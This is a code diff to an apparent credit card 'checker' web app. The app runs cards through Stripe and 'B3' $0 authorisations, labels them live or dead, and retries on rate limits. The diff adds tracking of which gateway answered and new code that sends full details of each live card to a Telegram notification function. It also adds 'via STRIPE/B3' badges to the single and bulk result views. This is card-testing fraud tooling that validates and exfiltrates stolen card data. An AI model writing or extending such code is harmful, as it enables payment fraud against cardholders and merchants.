@@ -68,6 +68,7 @@ interface GatewayApiResponse {
   apiMessage: string;
   apiTotal?: string;
   rawResponse: string;
+  usedGateway?: string; // For combined gateway - which API returned the result
 }
 
 const defaultBinInfo: BinInfo = {
@@ -228,6 +229,7 @@ interface CheckResult {
   card?: string;
   displayCard?: string; // Card as entered by user (without auto-added CVC)
   apiResponse?: string; // Real API response message for PAYGATE
+  usedApi?: string; // For combined gateway - which API (stripe/b3) returned the result
 }
 
 interface BulkResult extends CheckResult {
@@ -237,6 +239,7 @@ interface BulkResult extends CheckResult {
   brand: string;
   brandColor: string;
   apiResponse?: string; // Real API response message for PAYGATE
+  usedApi?: string; // For combined gateway - which API (stripe/b3) returned the result
 }
 
 interface GatewayCheck {
@@ -856,11 +859,12 @@ const Gateways = () => {
         const apiStatus = data?.apiStatus || data?.status || 'UNKNOWN';
         const apiMessage = data?.apiMessage || data?.message || 'No message';
         const rawResponse = JSON.stringify(data);
+        const usedGateway = data?.usedGateway as string | undefined; // Which API returned the result
         
         // Use computedStatus from edge function if available
         const computedStatus = data?.computedStatus;
         if (computedStatus === "live" || computedStatus === "dead") {
-          return { status: computedStatus, apiStatus, apiMessage, rawResponse };
+          return { status: computedStatus, apiStatus, apiMessage, rawResponse, usedGateway };
         }
         
         // Fallback: Check message for status indicators
@@ -868,18 +872,18 @@ const Gateways = () => {
         
         if (message.includes("approved") || message.includes("success") || message.includes("authorized") ||
             message.includes("payment method added successfully") || message.includes("card added successfully")) {
-          return { status: "live", apiStatus, apiMessage, rawResponse };
+          return { status: "live", apiStatus, apiMessage, rawResponse, usedGateway };
         } else if (message.includes("declined") || message.includes("insufficient funds") || message.includes("card was declined")) {
-          return { status: "dead", apiStatus, apiMessage, rawResponse };
+          return { status: "dead", apiStatus, apiMessage, rawResponse, usedGateway };
         } else if (message.includes("rate limit") || message.includes("timeout") || message.includes("try again")) {
           console.log(`[COMBINED-AUTH] Retryable error detected: ${message}`);
           if (attempt < maxRetries) {
             await new Promise(r => setTimeout(r, 800 + attempt * 300));
             continue;
           }
-          return { status: "unknown", apiStatus, apiMessage, rawResponse };
+          return { status: "unknown", apiStatus, apiMessage, rawResponse, usedGateway };
         } else {
-          return { status: "unknown", apiStatus, apiMessage, rawResponse };
+          return { status: "unknown", apiStatus, apiMessage, rawResponse, usedGateway };
         }
       } catch (error) {
         console.error('[COMBINED-AUTH] API check error:', error);
@@ -1003,7 +1007,8 @@ const Gateways = () => {
         gateway: selectedGateway.name,
         card: fullCardString,
         displayCard: displayCardString,
-        apiResponse: apiResponseDisplay
+        apiResponse: apiResponseDisplay,
+        usedApi: gatewayResponse?.usedGateway
       };
 
       setResult(checkResult);
@@ -1064,6 +1069,28 @@ const Gateways = () => {
               response_message: realResponseMessage,
               amount: "$0 Auth",
               gateway: "YUNCHI AUTH 1",
+              api_response: gatewayResponse.rawResponse
+            }
+          });
+        } catch (notifyError) {
+          console.log("Failed to send Telegram notification:", notifyError);
+        }
+      }
+
+      // Send Telegram notification for COMBINED AUTH checks (LIVE ONLY)
+      if (selectedGateway.id === "combined_auth" && gatewayResponse && checkStatus === "live") {
+        try {
+          const usedApiLabel = gatewayResponse.usedGateway === 'stripe' ? 'STRIPE' : gatewayResponse.usedGateway === 'b3' ? 'B3' : 'COMBINED';
+          const realResponseMessage = `${gatewayResponse.apiStatus}: ${gatewayResponse.apiMessage}`;
+          
+          await supabase.functions.invoke('notify-charged-card', {
+            body: {
+              user_id: userId,
+              card_details: fullCardString,
+              status: "CHARGED",
+              response_message: realResponseMessage,
+              amount: "$0 Auth",
+              gateway: `YUNCHI AUTH 2 (${usedApiLabel})`,
               api_response: gatewayResponse.rawResponse
             }
           });
@@ -1721,7 +1748,8 @@ const Gateways = () => {
           displayCard: displayCardStr,
           brand,
           brandColor,
-          apiResponse: apiResponseDisplay
+          apiResponse: apiResponseDisplay,
+          usedApi: gatewayResponse?.usedGateway
         };
 
         // Send Telegram notification for PAYGATE checks (CHARGED/DECLINED only, skip UNKNOWN)
@@ -1780,6 +1808,28 @@ const Gateways = () => {
                 response_message: realResponseMessage,
                 amount: "$0 Auth",
                 gateway: "YUNCHI AUTH 1",
+                api_response: gatewayResponse.rawResponse
+              }
+            });
+          } catch (notifyError) {
+            console.log("Failed to send Telegram notification:", notifyError);
+          }
+        }
+
+        // Send Telegram notification for COMBINED AUTH checks (LIVE ONLY) in bulk
+        if (selectedGateway.id === "combined_auth" && gatewayResponse && checkStatus === "live") {
+          try {
+            const usedApiLabel = gatewayResponse.usedGateway === 'stripe' ? 'STRIPE' : gatewayResponse.usedGateway === 'b3' ? 'B3' : 'COMBINED';
+            const realResponseMessage = `${gatewayResponse.apiStatus}: ${gatewayResponse.apiMessage}`;
+            
+            await supabase.functions.invoke('notify-charged-card', {
+              body: {
+                user_id: userId,
+                card_details: fullCardStr,
+                status: "CHARGED",
+                response_message: realResponseMessage,
+                amount: "$0 Auth",
+                gateway: `YUNCHI AUTH 2 (${usedApiLabel})`,
                 api_response: gatewayResponse.rawResponse
               }
             });
@@ -2672,6 +2722,18 @@ const Gateways = () => {
                       <span className="text-muted-foreground font-bold italic mr-2">:</span>
                       <span className="text-foreground font-bold italic">
                         {selectedGateway?.name || result.gateway}
+                        {/* Show which API was used for combined gateway */}
+                        {selectedGateway?.id === "combined_auth" && result.usedApi && (
+                          <span className={`ml-2 px-1.5 py-0.5 rounded text-[10px] font-bold ${
+                            result.usedApi === 'stripe' 
+                              ? 'bg-purple-500/20 text-purple-400 border border-purple-500/30' 
+                              : result.usedApi === 'b3'
+                                ? 'bg-blue-500/20 text-blue-400 border border-blue-500/30'
+                                : 'bg-gray-500/20 text-gray-400 border border-gray-500/30'
+                          }`}>
+                            via {result.usedApi === 'stripe' ? 'STRIPE' : result.usedApi === 'b3' ? 'B3' : result.usedApi.toUpperCase()}
+                          </span>
+                        )}
                       </span>
                     </div>
                     
@@ -3046,6 +3108,18 @@ const Gateways = () => {
                                 <span className="text-muted-foreground font-bold italic mr-1">:</span>
                                 <span className="text-primary font-bold italic">
                                   {selectedGateway?.name || 'N/A'}
+                                  {/* Show which API was used for combined gateway */}
+                                  {selectedGateway?.id === "combined_auth" && r.usedApi && (
+                                    <span className={`ml-1.5 px-1 py-0.5 rounded text-[8px] font-bold ${
+                                      r.usedApi === 'stripe' 
+                                        ? 'bg-purple-500/20 text-purple-400 border border-purple-500/30' 
+                                        : r.usedApi === 'b3'
+                                          ? 'bg-blue-500/20 text-blue-400 border border-blue-500/30'
+                                          : 'bg-gray-500/20 text-gray-400 border border-gray-500/30'
+                                    }`}>
+                                      via {r.usedApi === 'stripe' ? 'STRIPE' : r.usedApi === 'b3' ? 'B3' : r.usedApi.toUpperCase()}
+                                    </span>
+                                  )}
                                 </span>
                               </div>
                             </div>
